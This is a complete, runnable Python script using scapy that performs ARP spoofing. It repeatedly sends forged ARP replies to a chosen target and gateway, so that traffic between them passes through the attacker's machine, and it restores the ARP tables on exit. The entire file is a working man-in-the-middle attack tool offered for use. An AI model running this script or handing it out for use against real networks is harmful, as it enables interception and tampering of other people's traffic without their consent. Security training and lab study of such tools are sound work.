#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import sys


def get_mac(ip):
    """Get the MAC address for a given IP."""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            print(f"[ERROR] No response for IP: {ip}. Check if the host is online.")
            sys.exit(1)

    except Exception as e:
        print(f"[ERROR] Failed to get MAC for {ip}: {e}")
        sys.exit(1)


def spoof(target_ip, spoof_ip):
    """Send spoofed ARP packets to the target."""
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(spoof_packet, verbose=False)


def restore(destination_ip, source_ip):
    """Restore ARP tables by sending correct ARP responses."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(restore_packet, count=4, verbose=False)


def get_arguments():
    """Parse command-line arguments for target and gateway IPs."""
    parser = argparse.ArgumentParser(description="Simple ARP Spoofer")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="Gateway IP address")
    return parser.parse_args()


# Main Execution
if __name__ == "__main__":
    args = get_arguments()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip

    print(f"\n[INFO] Starting ARP Spoofing...")
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Gateway IP: {gateway_ip}\n")

    try:
        sent_packet_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packet_count += 2
            print(f"\r[+] Sent packets: {sent_packet_count}", end="", flush=True)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[+] CTRL+C detected! Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[INFO] ARP tables restored. Exiting...\n")
